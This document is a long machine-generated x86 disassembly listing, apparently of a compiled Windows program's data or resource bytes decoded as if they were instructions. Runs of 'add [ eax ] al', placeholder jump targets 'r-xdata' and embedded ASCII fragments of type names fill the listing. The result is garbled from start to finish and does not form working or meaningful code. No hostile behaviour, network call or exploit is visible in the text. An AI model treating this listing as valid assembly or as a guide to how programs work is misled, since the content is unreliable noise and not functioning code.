imul edi [ edx + 0x65 ] 0x3
add [ eax ] al
or [ eax ] al
add al [ eax ]
adc al 0x8f
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
pop es
je r-xdata
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
adc al 0x8f
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
add [ eax + eax ] bl
add [ eax ] al
mov al 0x8a
inc edx
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcb4 ] ch
cmp al 0x43
jb r-xdata
dec ebp
insd
imul edi [ edx + 0x65 ] 0x20002
inc esp
add [ eax + 0x500434a ] ah
dec esi
ja r-xdata
popad
insd
add al [ eax ]
add al [ eax ]
add [ eax + 0x49 ] bh
inc ebx
add [ esp + ecx * 2 ] cl
outsd
popad
inc esi
jb r-xdata
popad
insd
pop edx
add al dh
dec edx
inc ebx
add [ esi ] al
inc ebx
jb r-xdata
outsb
outsw
add al [ eax ]
add al bh
adc [ eax ] al
adc al 0x0
add [ eax ] al
pop es
dec eax
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
add al [ eax ]
add [ eax ] al
add al 0x0
pop ss
nop
inc edx
add [ eax + eax - 0xc ] al
push [ ecx - 0x70 ]
inc edx
add [ eax + eax - 0xc ] al
dec edi
nop
inc edx
add [ ebp ] cl
pushfd
adc [ eax ] al
add al [ eax ]
add eax 0x6e756f43
je r-xdata
add [ eax ] al
add al ch
cmp al 0x43
inc ebx
push ebx
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6f ] al
je r-xdata
push edi
jb r-xdata
insd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ edx ] al
add [ edi + ecx * 4 ] dl
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x4e ] 0x2656d61
add [ edx ] al
add [ eax ] bh
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add al 0x0
popad
je r-xdata
outsd
jb r-xdata
add [ eax + r-xdata ] dl
pop es
or eax 0x6d654d54
add [ edx ] al
add [ eax ] al
cmp eax 0x48300043
inc ebx
add al bl
dec esp
inc ebx
add [ esp + edi + 0x3ce80043 ] bl
inc ebx
popad
insd
push eax
lea eax [ edx ]
pushfd
mov [ edx ] es
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
inc edx
add [ edi + ecx * 4 - 0x701cffbe ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ edi ] al
nop
inc edx
cwde
pop [ edx ]
inc edx
jne r-xdata
add eax [ eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
adc al 0x8f
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ esi ] al
add [ eax ] al
add [ ecx ] al
add [ esi ] al
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
pushfd
adc [ eax ] al
or al 0x0
add eax 0x49736552
inc esp
add al [ eax ]
add al cl
cmp al 0x91
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bh
adc [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] cl
jae r-xdata
add [ eax ] dl
add [ eax + eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add al 0x0
cmp al 0x91
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bh
adc [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] cl
jae r-xdata
inc ebx
add [ eax + 0x48 ] ch
inc ebx
add [ esi + edi + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
clc
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
or [ eax + 0x52 ] cl
jae r-xdata
jae r-xdata
add [ ecx + edx * 4 + 0x42 ] ch
add [ ebx ] cl
jae r-xdata
jb r-xdata
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] eax
push es
jns r-xdata
or [ eax ] al
pop es
push edx
jae r-xdata
add [ eax ] al
enter 0x4011 0x0
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
inc eax
adc al [ eax ]
or al 0x0
pop es
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
xchg ecx eax
add [ eax ] al
add [ edx ] al
add [ eax + r-xdata ] dl
add bh bh
pushad
sbb al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x20 ]
push edx
jb r-xdata
pushfd
adc [ eax ] al
add al [ eax ]
add eax 0x6e756f43
je r-xdata
add [ eax ] al
mov eax eax
inc eax
xchg ecx eax
inc edx
add al [ gs : eax ]
add al [ eax ]
daa
add [ eax + 0x700434c ] ch
inc esp
jae r-xdata
popad
insd
add al [ gs : eax ]
add al cl
adc [ eax ] eax
or [ eax ] al
pop es
push edx
jae r-xdata
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x1c ]
outsb
arpl [ ebp + 0x7 ] sp
jae r-xdata
add [ edi ] al
andps xmm2 [ edx + 0x65 ]
jae r-xdata
add [ ebx + 0x429140c0 ] cl
add [ edx ] al
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
jne r-xdata
popad
insd
cwde
pop [ edx ]
pushfd
mov [ edx ] es
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
jb r-xdata
adc [ eax ] eax
jns r-xdata
add al 0x8b
dec edi
ja r-xdata
add bh bh
pushad
or [ ebx - 0x13fbdbbc ] al
arpl [ ebp + 0x53 ] sp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x10 ]
jae r-xdata
je r-xdata
push ebx
jns r-xdata
add al [ gs : eax ]
add al [ eax ]
pop esi
add [ eax + 0x4b ] cl
inc ebx
add [ ebx + eax * 2 ] cl
jb r-xdata
add bh bh
pushad
and [ ebx - 0x13fbdbbc ] al
mov eax [ esp + 0x4 ]
pop es
inc ebx
insb
popad
jae r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
inc esp
and al 0x4
in al dx
add [ eax ] al
add [ edx ] al
add [ ebp - 0x6e8fffc0 ] cl
inc edx
add [ ebx ] al
adc [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] al
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ecx + edx * 4 ] bh
popad
je r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
jae r-xdata
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x14 ]
popad
insd
dec edi
ja r-xdata
or [ eax ] al
add [ eax ] eax
cmp al 0x91
inc esi
jb r-xdata
inc eax
add ah cl
add [ esp + 0x4 ] 0xffffffec
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
in al dx
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jb r-xdata
add al [ eax ]
add al [ eax ]
inc esp
add al bl
dec esp
inc ebx
add [ 0x74697257 ] al
add eax [ gs : eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
cmp al 0x91
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
insb
insd
dec ecx
inc esp
add eax [ eax ]
mov eax [ eax ]
jmp [ eax + 0x18 ]
push 0x17069
add [ eax ] al
add [ ecx ] al
add [ eax ] al
sub_42939a
xchg esp eax
inc edx
add [ edx ] cl
add al [ eax ]
pop esi
xchg ebp eax
inc edx
add [ edx ] cl
add eax [ eax ]
cdq
xchg ebp eax
inc edx
add [ edx ] cl
add al 0x0
sti
xchg ebp eax
inc edx
add [ edx ] cl
add eax 0x42963900
add [ edx ] cl
push es
add [ edi - 0x6a ] bl
inc edx
add [ edx ] cl
pop es
add [ esi + edx * 4 + r-xdata ] bh
or [ eax ] al
sbb edx [ edi + r-xdata ]
or [ eax ] eax
xchg edi eax
inc edx
add [ edx ] cl
or al [ eax ]
push cs
push esp
push ebx
je r-xdata
push ebx
popad
insd
inc ecx
popad
jo r-xdata
imul eax [ gs : ebx ] 0x3
bound edx [ edx + 0x65 ]
popad
popad
add eax [ fs : ebx ]
pushfd
adc al [ eax ]
sbb [ eax ] al
add al 0x0
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
or al 0x0
add dh [ eax + 0x76 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ esi + ebx + 0x40 ] al
inc esp
rol [ ebx ] cl
add al 0x52
jb r-xdata
add al [ eax ]
add al [ eax ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
or [ edi + esi * 2 + 0x4f ] ah
jb r-xdata
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ esp + ebp * 2 + 0x69 ] ah
bound ecx [ ebp + 0x6f ]
jbe r-xdata
je r-xdata
add [ edx + edx * 8 ] cl
inc ebx
add [ edi ] al
inc esp
jae r-xdata
add al al
rol [ ebx ] 0x1
push es
inc ebx
jb r-xdata
add al [ eax ]
push esp
outsd
add eax [ ebx ]
pushfd
adc al [ eax ]
and [ eax ] al
add eax 0x42979800
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ebx + ecx * 8 ] dh
imul ebp [ bp + 0x2 ] 0x11142100
inc eax
add [ eax ] bl
add [ esi ] cl
insb
imul esp [ edx + 0x4e ] 0x6f507765
jae r-xdata
add al [ eax ]
pushfd
adc al [ eax ]
sbb al 0x0
add al 0x0
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add eax [ ebx ]
pushfd
adc al [ eax ]
sbb [ eax ] al
add al 0x0
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
or al 0x0
add dh [ eax + 0x76 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ esi + ebx + 0x40 ] al
add [ eax + eax ] dl
or dh [ eax + 0x63 ]
bound edx [ edi + 0x72 ]
imul esi [ esp + esi * 2 + 0x65 ] 0x200026e
add [ eax ] ah
adc al 0xd3
inc ebx
add [ ebx + edx * 2 ] al
imul eax [ gs : ebx ] 0x3
add eax [ gs : ebx ]
jb r-xdata
add [ ebp ] cl
popad
je r-xdata
imul esp [ edx + 0x4f ] 0x65736666
inc ebx
outsd
insd
insd
imul esi [ esi + eax * 2 + 0x6c ] 0x2736761
add [ edx ] al
add [ esi ] ah
add [ eax ] dl
salc
inc ebx
add [ esi ] al
push edx
jbe r-xdata
add [ edx ] al
add [ ebp ] bl
sbb al 0xd6
je r-xdata

je r-xdata
jb r-xdata
jns r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add eax [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ edx ] al
add [ esi ] al
push ebx
je r-xdata
adc al 0x11
inc eax
add [ eax + eax ] dl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
add [ eax ] al
or ah [ edi + esi * 2 + 0x4c ]
outsd
arpl [ ebx + 0x54 ] bp
jns r-xdata
inc eax
add [ eax + eax ] bl
jb r-xdata
inc eax
add [ eax + eax ] dl
add ah [ ebx + 0x62 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
or ah [ edi + esi * 2 + 0x4c ]
outsd
arpl [ ebx + 0x54 ] bp
jns r-xdata
je r-xdata
inc eax
add [ eax ] ah
add [ eax + eax ] al
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ ecx + ebp * 2 + 0x62 ] ebp
dec edi
jae r-xdata
imul edx [ edx + 0x65 ] 0x67
imul ebp [ edi + 0x6e ] 0x129c0303
add [ eax + edx + 0xc0040 ] bl
push cs
jb r-xdata
outsb
add al [ eax ]
add al [ eax ]
add [ esi + edx * 8 ] al
inc ebx
add [ esi ] al
inc ebx
outsd
insd
insd
imul esi [ ebx + eax + 0x3 ] r-xdata
adc [ eax ] al
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + eax ] cl
add esi [ ebx + 0x74 ]
insd
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax ] dl
add [ edx ] al
arpl [ edx + 0x2 ] sp
add [ ecx ] ah
adc al 0x11
inc eax
add [ eax ] bl
add [ esi ] al
arpl [ edx + 0x52 ] sp
popad
add al [ fs : eax ]
and [ ecx + edx ] edx
outsd
outsb
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
cwde
rol [ ebx ] cl
pop es
push ebx
je r-xdata
insb
add al [ eax ]
add al [ eax ]
dec ebp
add [ edx + edx * 8 + 0x43 ] al
add [ edx + edx * 2 ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
cwde
xchg edi eax
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + 0x4297 ] bl
add [ eax + eax ] dl
pop es
jo r-xdata
inc eax
add [ eax ] dl
add [ edx ] al
arpl [ edx + 0x2 ] sp
add [ eax ] al
inc esp
push ds
popad
insd
add al [ eax ]
add [ ecx + edx * 4 + 0x42 ] ch
add [ eax ] cl
add [ ecx ] cl
dec edi
ja r-xdata
add ebx [ edx + edx + 0x140040 ]
add al [ gs : eax ]
add al [ eax ]
pop edi
add [ eax ] ch
salc
inc ebx
add [ edx * 2 + 0x636f6c6e ] cl
imul edx [ edx + 0x65 ] 0x67
imul ebp [ edi + 0x6e ] 0x129c0303
inc eax
add [ eax ] ah
add [ eax + eax ] al
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or [ ecx + ebp * 2 + 0x62 ] ebp
dec edi
jae r-xdata
inc ebx
add [ edx ] cl
dec esp
outsd
arpl [ ebx + 0x52 ] bp
imul ebp [ gs : bx + 0x6e ] 0x129c0303
add eax [ ebx ]
pushfd
adc al [ eax ]
or al 0x0
add [ eax ] eax
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
pop ebp
add [ esi + edx * 8 ] bl
add al [ eax ]
add al [ gs : eax ]
add al [ eax ]
dec edx
add [ esi + edx * 8 ] dh
inc ebx
add [ ebx + edx * 2 ] al
je r-xdata
inc eax
add [ eax ] al
xor al 0xcb
imul edi [ edx + 0x65 ] 0x129c0303
inc eax
add [ eax + eax ] dl
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] cl
or ch [ ecx + ebp * 2 + 0x62 ]
dec esi
ja r-xdata
inc eax
jb r-xdata
popad
je r-xdata
je r-xdata
dec edi
ja r-xdata
popad
je r-xdata
inc eax
add [ eax + eax ] bl
or [ ebx + 0x62 ] esp
push edi
jb r-xdata
add [ ecx ] ah
adc al 0x11
bound eax [ eax ]
cld
rol [ ebx ] cl
push es
inc ebx
outsd
jo r-xdata
imul edi [ edx + 0x65 ] 0x20002
add al [ fs : eax ]
add al [ eax ]
push ecx
add [ edx + edx * 8 + 0x57050043 ] ch
push edx
popad
push 0x27069
add al [ eax ]
daa
insd
inc ecx
popad
jo r-xdata
and [ ebx + ecx * 8 ] esi
inc eax
add [ eax + eax ] cl
add esi [ ebx + 0x74 ]
insd
add al [ eax ]
add al [ eax ]
nop
pushfd
xchg edi eax
inc edx
add [ edi ] al
push cs
push esp
push ebx
je r-xdata
insb
popad
add al [ bx + si ]
add al [ eax ]
xor al [ eax ]
mov al 0xd6
inc ebx
add [ 0x6e6f6c43 ] al
add eax [ gs : ebx ]
pushfd
adc al [ eax ]
adc [ eax ] al
add al [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
adc al 0x11
add [ eax ] al
cwde
inc edx
add [ eax ] al
add [ eax ] al
add [ ebx ] al
jb r-xdata
inc eax
jb r-xdata
add eax [ eax ]
cwde
xchg edi eax
inc edx
add [ eax ] cl
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
and [ eax ] eax
0x40
inc eax
add [ eax + eax ] dl
or [ eax ] al
adc al 0x41
jne r-xdata
cdq
inc edx
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
add [ eax + ebx * 4 ] ah
inc edx
add [ eax ] cl
or [ edi + eax * 2 + 0x65 ] edx
je r-xdata
push 0x408d7069
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 4 ] al
insb
popad
jae r-xdata
inc edx
add [ edx ] al
add [ edx ] al
xchg edi eax
xchg ebx eax
inc edx
add ah dl
sbb eax 0x40
pop es
inc ebx
insb
popad
jae r-xdata
add [ edx ] cl
inc edi
jne r-xdata
dec ecx
outsb
arpl [ ebp + esi * 2 + 0x64 ] bp
inc ecx
jae r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add [ eax - 0x2fffbfa8 ] dh
add [ ecx ] al
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
jae r-xdata
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insb
popad
jae r-xdata
je r-xdata
jae r-xdata
add [ eax + eax ] al
add [ eax ] al
inc eax
add al bl
pop eax
aam 0x58
adc [ eax + edx * 2 + 0x65 ] dl
jb r-xdata
inc edx
add [ edx ] al
add [ edx ] al
add [ esi + eax * 4 ] ch
inc edx
add [ eax + eax ] cl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edx ] al
add [ edx ] al
rcl [ edi + 0x20042 ] cl
add dh bl
xchg edi eax
push esp
jae r-xdata
push es
jbe r-xdata
jae r-xdata
add [ edi ] ah
add [ eax + 0x70042f6 ] ah
inc esp
jae r-xdata
add [ edx ] al
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
imul esi [ ebx + 0x74 ] 0x43746e65
insb
popad
jae r-xdata
jae r-xdata
or [ gs : esi + 0x61 ] dh
inc edx
add [ eax ] al
add [ edx ] al
add [ ebx + 0x429a30c0 ] cl
add [ ebx ] al
or dl [ esi + edx * 2 + 0x61 ]
je r-xdata
dec esi
add [ eax ] al
adc [ eax ] al
insb
add al [ eax ]
add [ eax ] ah
cwde
inc edx
add [ eax ] cl
add [ eax + edx * 2 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] al
add [ eax ] al
0x42 0x5304
jb r-xdata
push ebp
inc eax
add [ eax + 0x42f6 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
inc edi
jb r-xdata
add ah al
pushad
inc edx
add [ 0x2000000 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add ah al
pushad
inc edx
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
js r-xdata
jae r-xdata
add eax 0x694e6176
insb
or al 0x76
popad
jbe r-xdata
imul ebp [ esi + 0x61 ] 0x76057972
popad
push ebx
je r-xdata
push esp
jns r-xdata
insb
popad
add [ bx + si ] eax
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
or [ esi + 0x61 ] dh
push ebx
imul ebp [ esi + 0x67 ] 0x4e617605
inc ebx
outsd
insb
insb
push es
jbe r-xdata
dec ecx
outsb
je r-xdata
arpl [ edx ] ax
add [ edx ] al
add [ eax + r-xdata ] dl
pop es
or al 0x54
inc ebx
insb
popad
jae r-xdata
add al [ eax ]
add [ edx + 0x42 ] bl
add al 0x53
jns r-xdata
jo r-xdata
inc edx
add ah al
cwde
inc edx
add bh bl
add al [ eax ]
mov eax eax
les ebx [ eax + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x9a
add [ ebx + 0x429b18c0 ] cl
inc edx
add [ eax ] cl
or edx [ edx + edx * 2 + 0x65 ]
popad
jb r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x69 ]
insb
jb r-xdata
rcr [ eax ] 0x9b
inc edx
outsd
jae r-xdata
jb r-xdata
jae r-xdata
dec esp
push ebx
jne r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ 0x2c000000 ] dl
0x76060042 0x4e61
pop es
inc ebx
insb
popad
jae r-xdata
dec cx
imul ebp [ esp + ecx + 0x76 ] 0x6c6f4361
popad
dec esi
dec esp
imul esi [ ebx + 0x74 ] 0x49617606
outsb
je r-xdata
jb r-xdata
xor cl [ edx ]
jbe r-xdata
imul ebp [ esi + 0x67 ] 0x49617607
outsb
je r-xdata
inc esi
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ edx + 0x42 ] bl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
cmp al 0x0
shl dh 0x1
inc edx
add [ eax ] cl
inc edi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
0x42 0x5304
insb
jne r-xdata
adc [ ecx + r-xdata ] bl
hlt
add al [ eax ]
add [ eax ] al
add al 0x0
jb r-xdata
jb r-xdata
jb r-xdata
or ah [ fs : esi + 0x66 ]
outsb
arpl [ ecx + 0x6 ] di
jbe r-xdata
push eax
jae r-xdata
add [ eax ] ecx
push es
jae r-xdata
jb r-xdata
pop es
jbe r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebx * 4 ] dl
inc esi
imul ebp [ ebp + 0x72 ] 0x67616c46
add [ eax ] eax
add eax 0x65536176
je r-xdata
jne r-xdata
inc ebp
js r-xdata
push es
jbe r-xdata
jbe r-xdata
insb
popad
jae r-xdata
add [ edx ] cl
inc ecx
inc ebx
insb
popad
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
inc edi
jb r-xdata
push edx
popad
jb r-xdata
insb
popad
jae r-xdata
add [ eax - 0x42 ] bl
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax - 0x42 ] bl
inc edx
add [ esi ] al
push esp
push edi
jb r-xdata
push edi
arpl [ eax ] ax
add [ eax ] ecx
push es
push edx
popad
jb r-xdata
inc ebx
push 0x50646c69
or ah [ esi + 0x66 ]
inc esp
popad
je r-xdata
jb r-xdata
je r-xdata
pushad
fwait
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x69 ]
insb
add [ eax + r-xdata ] dl
push es
imul ebp [ esi + 0x67 ] 0x760a656c
popad
imul ebp [ edi + 0x6e ] 0x53617608
dec ecx
outsb
je r-xdata
outsb
pop es
jbe r-xdata
outsb
or [ fs : esi + 0x61 ] dh
push ebx
je r-xdata
push esp
outsb
je r-xdata
inc esi
popad
insb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x98c47265
inc edx
add eax [ eax ]
les esp [ eax + 0x42 ]
add [ eax ] cl
add [ edx ] al
add [ eax ] al
0x42 0x5304
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
insb
jne r-xdata
push esp
push esi
popad
dec esi
popad
insd
add al [ gs : eax ]
add al [ eax ]
cmp [ eax ] al
insb
test [ edx ] 0x7465470a
inc ebx
push edi
jb r-xdata
mov esp 0x800429b
add [ eax + r-xdata ] dl
or [ ebx ] cl
push esp
push edi
jb r-xdata
fwait
inc edx
add [ edx ] al
add [ eax - 0x65 ] bh
adc al 0x9b
add [ ebp + ebx * 4 + 0x2c0042 ] dl
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
je r-xdata
pushfd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 4 ] ah
inc edx
add [ eax + 0x6800429c ] ch
popfd
inc edx
add [ eax ] al
je r-xdata
add [ eax - 0x4f ] bh
push esp
push edx
popad
jb r-xdata
push eax
or [ esi + 0x61 ] esi
push edi
push ebx
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
sub al 0x86
push 0x68004046
inc esi
popad
push ebx
je r-xdata
pop es
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x616c4307
dec ecx
xor al 0xc
jbe r-xdata
jb r-xdata
outsb
or [ bp + 0x61 ] dh
inc esp
outsd
jne r-xdata
inc edx
add [ ebx ] cl
dec cx
outsb
push 0x74697265
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc al 0x9b
inc esi
cmp [ ebx + 0x74 ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ esi + eax * 4 ] ch
inc edx
add [ esi ] al
je r-xdata
jne r-xdata
popad
insd
add al [ eax ]
add ah ah
adc [ eax ] al
or [ eax ] al
add [ eax ] al
pop es
inc esi
inc edx
jne r-xdata
add [ eax ] al
jb r-xdata
nop
cwde
jb r-xdata
js r-xdata
add al [ eax ]
nop
imul ebp [ esi + 0x67 ] 0x49617607
inc edx
add [ eax + eax ] al
add [ eax ] al
pop es
inc esi
push ebx
je r-xdata
add [ eax ] al
or [ eax ] eax
add [ esi + eax * 4 ] ch
insd
add al [ eax ]
popad
inc ebx
outsb
insb
or dh [ gs : esi + 0x61 ]
jae r-xdata
push ebp
inc esi
insb
pop es
inc ebx
insb
popad
add [ eax ] al
jb r-xdata
inc ebx
jb r-xdata
push edx
add [ eax ] al
jb r-xdata
add [ edx + eax * 2 + 0x540b0800 ] bl
push ebx
je r-xdata
add [ eax + r-xdata ] dl
or [ ebx ] cl
push esp
jb r-xdata
pop eax
mov esi 0x2e0042
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
pop eax
mov esi 0x57060042
outsb
insb
dec ecx
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax - 0x4f ] bh
inc edx
add [ esi ] al
or edx [ edi + edx * 2 + 0x72 ]
imul esi [ ebp + 0x72 ] 0x636f7250
add [ ecx ] al
or [ esi ] al
jae r-xdata
insd
pop es
push esp
push ebx
je r-xdata
jb r-xdata
add al dh
lahf
popad
je r-xdata
cwde
pushad
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] cl
inc esi
inc ecx
outsb
arpl [ ebp + 0x73 ] sp
je r-xdata
push ebx
jb r-xdata
pushfd
adc [ eax ] al
or al 0x0
add [ eax ] al
or [ esi + 0x42 ] al
jne r-xdata
add [ eax ] al
inc eax
mov al 0x58
popad
insd
push eax
jb r-xdata
inc ebx
add [ eax + 0x4d ] ah
inc ebx
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0x46 ] ch
inc eax
add [ ebp + edx * 2 + 0x4d380040 ] ah
popad
insd
add [ esi + eax * 4 ] ch
inc edx
add [ esi ] ch
add [ eax ] al
add [ edx ] al
arpl [ eax ] ax
add [ esp + eax * 2 ] dl
imul bp [ gs : esi + 0x65 ] 0x6942
outsb
popad
jb r-xdata
jb r-xdata
inc edx
add [ esi ] cl
inc esp
imul bp [ gs : esi + 0x65 ] 0x7250
outsd
jo r-xdata
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add eax [ eax ]
and [ edi + 0x42 ] bl
add al 0x53
add al 0x4e
popad
insd
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
pop es
inc edx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] ah
